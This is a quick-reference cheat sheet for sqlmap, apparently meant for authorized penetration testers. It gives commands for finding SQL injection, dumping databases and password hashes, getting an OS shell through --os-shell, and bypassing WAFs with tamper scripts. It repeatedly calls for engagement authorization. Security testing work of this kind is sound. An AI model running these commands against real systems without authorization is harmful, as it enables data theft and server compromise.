# sqlmap Cheat Sheet
**Automated SQL Injection Testing — Quick Reference**

---

## Core Workflow

1. Confirm authorization
2. Identify a suspected injectable parameter (manually or via Burp/ZAP)
3. Confirm injection with sqlmap at default settings
4. Enumerate databases → tables → data
5. Escalate depth (`--risk`/`--level`) only if needed
6. Document findings — technique used, data exposed, business impact

---

## Basic Enumeration Commands

| Command | Purpose |
|---|---|
| `sqlmap -u "http://target/page?id=1" --dbs` | List databases |
| `sqlmap -u "..." -D dbname --tables` | List tables in a database |
| `sqlmap -u "..." -D dbname -T tablename --columns` | List columns in a table |
| `sqlmap -u "..." -D dbname -T tablename --dump` | Dump table data |
| `sqlmap -u "..." --current-user` | Get current DB user |
| `sqlmap -u "..." --current-db` | Get current database name |
| `sqlmap -u "..." --passwords` | Dump DB user password hashes |

---

## Working from Captured Requests

| Command | Purpose |
|---|---|
| `sqlmap -r request.txt --batch` | Test using a request file (e.g., from Burp Suite) |
| `sqlmap -r request.txt -p paramname` | Target a specific parameter within the request |

---

## Risk & Level (test depth/intrusiveness)

| Setting | Range | Meaning |
|---|---|---|
| `--level` | 1–5 | How many injection points/tests attempted (higher = more thorough, slower) |
| `--risk` | 1–3 | How intrusive tests are (higher = includes riskier payloads, e.g., time-based or heavier queries) |

Default (`--level=1 --risk=1`) is appropriate for most first passes.

---

## Injection Techniques (`--technique`)

| Code | Technique |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query-based |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

Example: `--technique=BEU` restricts testing to boolean, error, and UNION-based only.

---

## Escalation Flags (use only within explicit authorized scope)

| Flag | Purpose |
|---|---|
| `--os-shell` | Attempt to get an interactive OS shell |
| `--os-cmd` | Execute a single OS command |
| `--sql-shell` | Interactive SQL shell on the compromised DB |
| `--tamper=<script>` | Apply payload obfuscation to bypass basic WAF/filters |

---

## Pro Tips

- **Always confirm the injection manually first** — sqlmap automates exploitation, it doesn't replace understanding *why* the parameter is vulnerable.
- `--batch` answers all prompts with defaults — useful for scripting, but review what it assumed afterward.
- Start with `--dbs` before jumping to `--dump` — enumerate before extracting.
- `-r request.txt` (a saved Burp request) is more reliable than manually rebuilding a `-u` URL with headers/cookies.
- Treat `--os-shell` as a full-compromise action requiring explicit engagement authorization — not a routine flag.
